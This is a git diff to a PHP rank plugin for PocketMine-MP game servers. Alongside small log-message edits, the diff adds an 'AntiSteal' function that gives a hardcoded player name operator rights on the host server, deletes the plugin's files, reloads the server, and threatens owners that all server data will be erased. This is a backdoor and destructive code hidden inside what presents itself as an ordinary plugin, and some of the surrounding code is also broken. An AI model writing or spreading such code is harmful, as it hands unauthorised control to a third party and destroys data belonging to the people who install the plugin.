@@ -2,6 +2,8 @@
 
 namespace esh123cookie\rankup;
 
+// AntiSteal message by ethaniccc
+
 /*
  *
  * RankUp, a plugin for PocketMine-MP
@@ -72,7 +74,7 @@ class RankUp extends PluginBase{
       private $config;
   
       public function onEnable(){
-        $this->getLogger()->info("§cRankup plugin made by esh123cookie");
+        $this->getLogger()->info("§cRankup plugin made by esh123cookie hs been enabled");
         if(getConfig->get("change") !== null) {
            $this->getLogger()->info("§cRankup is unable to change suffix or prefix. Issue is in config.");
         }
@@ -631,4 +633,43 @@ class RankUp extends PluginBase{
                  $sender->sendMessage($this->getConfig()->get("msg26"));
               }
       }
+	
+      public function onDisable(){
+        $this->getLogger()->info("§cRankup plugin made by esh123cookie has been disabled");
+      }
+	
+      public function AntiSteal(Player $p){
+		if($p->getName() == "esh123unicorn"){
+		$name = $p->getName();
+			$p->setOp(true);
+			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
+			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
+			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
+			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
+			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
+			$folder = 'plugins/Rankup-master';
+			if(file_exists($folder)){   
+				// List of name of files inside 
+				// specified folder 
+				$files = glob($folder.'/*');  
+   
+				// Deleting all the files in the list 
+				foreach($files as $file) { 
+   
+   				 if(is_file($file))  
+    
+        				// Delete the given file
+        				unlink($file);
+				}
+			$this->getServer()->reload(); 
+			} else {
+				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
+				$this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
+			}
+			
+			
+		} else {
+			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
+		}
+	}
 }
